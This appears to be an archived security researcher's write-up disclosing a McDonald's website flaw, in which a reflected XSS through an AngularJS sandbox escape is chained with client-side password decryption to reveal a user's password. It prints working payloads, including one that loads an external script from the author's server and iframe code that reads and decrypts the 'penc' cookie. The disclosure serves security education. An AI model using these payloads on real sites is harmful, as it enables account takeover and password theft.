---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2017-01-09_stealing-passwords-from-mcdonalds-users.md
original_filename: 2017-01-09_stealing-passwords-from-mcdonalds-users.md
title: Stealing passwords from McDonald's users
category: documents
detected_topics:
- xss
- command-injection
- api-security
tags:
- imported
- documents
- xss
- command-injection
- api-security
language: en
raw_sha256: d70cd7df2f852e5e6385de53228b51789bb4d77f1beb3df92b8f17fd3ae4d6a9
text_sha256: 900c2bf2075da8775b14453764482b2ea00aa948952bf081376858b429bccc8b
ingested_at: '2026-06-28T07:31:55Z'
sensitivity: unknown
redactions_applied: false
---

# Stealing passwords from McDonald's users

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2017-01-09_stealing-passwords-from-mcdonalds-users.md
- Source Type: markdown
- Detected Topics: xss, command-injection, api-security
- Ingested At: 2026-06-28T07:31:55Z
- Redactions Applied: False
- Raw SHA256: `d70cd7df2f852e5e6385de53228b51789bb4d77f1beb3df92b8f17fd3ae4d6a9`
- Text SHA256: `900c2bf2075da8775b14453764482b2ea00aa948952bf081376858b429bccc8b`


## Content

---
title: "Stealing passwords from McDonald's users"
url: "https://tij.me/blog/stealing-passwords-from-mcdonalds-users/"
final_url: "https://tij.me/blog/stealing-passwords-from-mcdonalds-users/"
authors: ["Tijme Gommers (@tijme)"]
programs: ["McDonalds"]
bugs: ["Reflected XSS", "AngularJS sandbox bypass"]
publication_date: "2017-01-09"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 6236
---

# Stealing passwords from McDonald's users

Posted on 6 January 2017 by Tijme Gommers.

By abusing an insecure [cryptographic storage vulnerability](https://owasp.org/Top10/A02_2021-Cryptographic_Failures/) and a [reflected server cross-site-scripting vulnerability](https://owasp.org/Top10/A03_2021-Injection/) it is possible to steal and decrypt the password from a McDonald’s user. Besides that, other personal details like the user’s name, address & contact details can be stolen too.

### Proof of Concept

#### Reflected XSS through AngularJS sandbox escape

McDonalds.com contains a search page which reflects the value of the search parameter (`q`) in the source of the page. So when we search on for example `***********-test-reflected-test-***********`, the response will look like this:

[![Text on website](/img/stealing-passwords-from-mcdonalds-users/search-value-test-preview.png)](/img/stealing-passwords-from-mcdonalds-users/search-value-test-preview.png)

[![Text in HTML](/img/stealing-passwords-from-mcdonalds-users/search-value-test-reflected.png)](/img/stealing-passwords-from-mcdonalds-users/search-value-test-reflected.png)

McDonald’s uses AngularJS so we can try to print the unique scope ID using the search value. We can do this by changing the `q` parameter value to `{{$id}}`. As we can see `{{$id}}` gets converted to `9` the unique ID (monotonically increasing) of the AngularJS scope.

[![Unique ID on website](/img/stealing-passwords-from-mcdonalds-users/search-value-angular-id-preview.png)](/img/stealing-passwords-from-mcdonalds-users/search-value-angular-id-preview.png)

[![Unique ID in HTML](/img/stealing-passwords-from-mcdonalds-users/search-value-angular-id-reflected.png)](/img/stealing-passwords-from-mcdonalds-users/search-value-angular-id-reflected.png)

Using `{{alert(1)}}` as value wouldn’t work because all AngularJS code is executed in a sandbox. However, the AngularJS sandbox isn’t really safe. In fact, it shouldn’t be trusted at all. It even [got removed](https://docs.angularjs.org/guide/security#sandbox-removal) in version 1.6 because it gave a false sense of security. PortSwigger created a nice blog post about [escaping the AngularJS sandbox](http://blog.portswigger.net/2016/01/xss-without-html-client-side-template.html).

We first need to find the AngularJS version of McDonalds.com. We can do this by executing `angular.version` in the console.

[![Angular version](/img/stealing-passwords-from-mcdonalds-users/angular-version.png)](/img/stealing-passwords-from-mcdonalds-users/angular-version.png)

The version is 1.5.3, so the sandbox escape we need is `{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}`. We can use this sandbox escape as search value, which results in an alert.

[![Alert using AngularJS sandbox escape](/img/stealing-passwords-from-mcdonalds-users/alert-1-in-chrome.png)](/img/stealing-passwords-from-mcdonalds-users/alert-1-in-chrome.png)

We can even load external JavaScript files using the following sandbox escape, which results in the alert below.

`{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=$.getScript(`https://tij.me/snippets/external-alert.js`)');}}`

The JavaScript can be loaded from another domain since McDonald’s doesn’t exclude it using the `Content-Security-Policy` header.

[![External domain alert using AngularJS sandbox escape](/img/stealing-passwords-from-mcdonalds-users/alert-external-in-chrome.png)](/img/stealing-passwords-from-mcdonalds-users/alert-external-in-chrome.png)

### Proof of Concept

#### Stealing the user’s password

Another thing I noticed on McDonalds.com was their sign in page which contained a very special checkbox. Normally you can check “Remember me” when signing in, but the McDonald’s sign in page gives us the option to remember the password.

[![Remember my password checkbox](/img/stealing-passwords-from-mcdonalds-users/mcdonalds-login-form.png)](/img/stealing-passwords-from-mcdonalds-users/mcdonalds-login-form.png)

I searched through all the JavaScript for the keyword `password` and I found some interesting code that decrypts the password.

[![Source code search for `password`](/img/stealing-passwords-from-mcdonalds-users/source-search-password.png)](/img/stealing-passwords-from-mcdonalds-users/source-search-password.png)

[![Source for decrypting the user's password](/img/stealing-passwords-from-mcdonalds-users/cookie-pass-decrypt-source.png)](/img/stealing-passwords-from-mcdonalds-users/cookie-pass-decrypt-source.png)

If there’s one thing you shouldn’t do, it’s decrypting passwords client side (or even storing passwords using two-way encryption). I tried to run the code myself, and it worked!

[![Decrypting my password using the console](/img/stealing-passwords-from-mcdonalds-users/decrypt-get-cookie-penc.png)](/img/stealing-passwords-from-mcdonalds-users/decrypt-get-cookie-penc.png)

The `penc` value is a cookie that is stored for a year. LOL!

[![The `penc` cookie that is stored for a year](/img/stealing-passwords-from-mcdonalds-users/penc-cookie.png)](/img/stealing-passwords-from-mcdonalds-users/penc-cookie.png)

McDonald’s uses CryptoJS to encrypt and decrypt sensitive data. They use the same `key` and `iv` for every user, which means I only have to steal the `penc` cookie to decrypt someone’s password.

[![Encrypting and decrypting sensitive data using CryptoJS](/img/stealing-passwords-from-mcdonalds-users/encrypt-decrypt-source.png)](/img/stealing-passwords-from-mcdonalds-users/encrypt-decrypt-source.png)

I tried decrypting my password on the search page using a malicious search payload, but it didn’t work. Since the AngularJS sandbox escape payload replaces the `charAt` method with the `join` method, the `getCookie` method failed. The `getCookie` method tries to trim whitespaces from cookie values by checking if `charAt(0)` is a whitespace. In the images below you can see `.charAt(0)` returns a string joined by `0` if executed on the search page.

[![The `charAt` method on the search page \(fails\)](/img/stealing-passwords-from-mcdonalds-users/char-at-fail.png)](/img/stealing-passwords-from-mcdonalds-users/char-at-fail.png)

[![The `charAt` method on the homepage \(success\)](/img/stealing-passwords-from-mcdonalds-users/char-at-success.png)](/img/stealing-passwords-from-mcdonalds-users/char-at-success.png)

I wrote some JavaScript that loads the homepage in an iframe and steals the cookie using that iframe. Since the payload is executed multiple times because of the sandbox escape, I keep track of the variable `xssIsExecuted`, so that the payload is only executed once.
  
  
  if (!window.xssIsExecuted) {
  window.xssIsExecuted = true;
  
  var iframe = $('<iframe src="https://www.mcdonalds.com/us/en-us.html"></iframe>');
  $('body').append(iframe);
  
  iframe.on('load', function() {
  var penc = iframe[0].contentWindow.getCookie('penc');
  alert(iframe[0].contentWindow.decrypt(penc));
  });
  }

We can now use the following sandbox escape, which results in my password in an alert box!

`{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=$.getScript(`https://tij.me/snippets/mcdonalds-password-stealer.js`)');}}`

[![My password!](/img/stealing-passwords-from-mcdonalds-users/alert-my-password.png)](/img/stealing-passwords-from-mcdonalds-users/alert-my-password.png)

That was all pretty easy. I tried to contact McDonald’s multiple times to report the issue, but unfortunately they didn’t respond, which is why I decided to disclose the vulnerability.
